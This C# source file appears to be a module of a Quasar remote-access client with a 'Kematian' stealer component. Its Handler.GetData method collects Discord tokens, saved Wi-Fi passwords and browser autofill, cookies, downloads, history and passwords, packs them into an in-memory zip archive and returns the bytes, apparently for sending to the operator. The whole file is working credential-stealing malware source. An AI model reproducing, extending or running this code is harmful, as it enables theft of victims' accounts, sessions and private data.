using Quasar.Client.Kematian.Browsers;
using Quasar.Client.Kematian.Discord;
using Quasar.Client.Kematian.Wifi;
using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Threading.Tasks;


namespace Quasar.Client.Kematian
{
    public class Handler
    {
        // create a zip file in memory and return the bytes
        public static byte[] GetData()
        {
            byte[] data = null;
            using (var memoryStream = new MemoryStream())
            {
                // make zip archive in mem stream
                using (var archive = new ZipArchive(memoryStream, ZipArchiveMode.Create, true))
                {
                    var retriever = new BrowsersRetriever();

                    var methods = new KeyValuePair<Func<string>, string>[]
                    {
                                new KeyValuePair<Func<string>, string>(GetTokens.Tokens, "Discord\\tokens.txt"),
                                new KeyValuePair<Func<string>, string>(GetWifis.Passwords, "Wifi\\Wifi.txt"),
                                new KeyValuePair<Func<string>, string>(retriever.GetAutoFillData, "Browsers\\autofill.json"),
                                new KeyValuePair<Func<string>, string>(retriever.GetCookies, "Browsers\\cookies_netscape.txt"),
                                new KeyValuePair<Func<string>, string>(retriever.GetDownloads, "Browsers\\downloads.json"),
                                new KeyValuePair<Func<string>, string>(retriever.GetHistory, "Browsers\\history.json"),
                                new KeyValuePair<Func<string>, string>(retriever.GetPasswords, "Browsers\\passwords.json"),
                    };

                    foreach (var methodPair in methods)
                    {
                        try
                        {
                            var content = methodPair.Key();
                            var zipEntry = archive.CreateEntry(methodPair.Value);
                            using (var entryStream = new BufferedStream(zipEntry.Open()))
                            using (var streamWriter = new StreamWriter(entryStream))
                            {
                                streamWriter.Write(content);
                            }
                        }
                        catch (Exception ex)
                        {
                            Debug.WriteLine($"Error processing {methodPair.Value}: {ex.Message}");
                        }
                    }
                }
                data = memoryStream.ToArray();
            }
            return data;
        }
    }
}
